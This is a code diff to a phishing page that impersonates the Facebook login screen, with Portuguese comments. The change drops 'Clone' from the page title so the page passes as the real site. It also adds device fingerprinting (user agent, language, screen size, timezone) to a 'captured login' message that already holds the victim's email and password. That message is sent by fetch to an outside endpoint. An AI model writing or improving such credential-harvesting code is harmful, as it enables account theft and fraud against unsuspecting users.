@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login - Facebook Clone</title>
+  <title>Login - Facebook</title>
   <style>
     * {
       margin: 0;
@@ -135,10 +135,23 @@
         return;
       }
 
+      // Coletando informações do dispositivo
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const screenWidth = screen.width;
+      const screenHeight = screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
       const message = `
 🔐 *Novo Login Capturado*
 📧 Email: ${email}
 🔑 Senha: ${password}
+
+📱 *Informações do Dispositivo*
+🌐 Navegador/SO: ${userAgent}
+🖥️ Resolução: ${screenWidth}x${screenHeight}
+🌍 Idioma: ${language}
+⏰ Fuso horário: ${timezone}
       `;
 
       fetch(URL, {
